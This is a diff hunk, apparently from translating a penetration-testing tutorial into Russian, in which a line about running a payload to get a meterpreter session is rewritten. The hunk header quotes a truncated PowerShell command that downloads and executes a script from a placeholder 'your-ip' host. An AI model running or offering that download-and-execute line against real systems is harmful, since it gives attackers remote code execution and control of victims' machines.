@@ -100,7 +100,7 @@ powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-po
 
 <img src="https://i.imgur.com/uhZl5vx.png"/>
 
-Execute the payload and you'll see a meterpreter session will be popped
+Запустите полезную нагрузку, и Вы увидите, что откроется сеанс meterpreter:
 
 <img src="https://i.imgur.com/YF8AsSf.png"/>
 
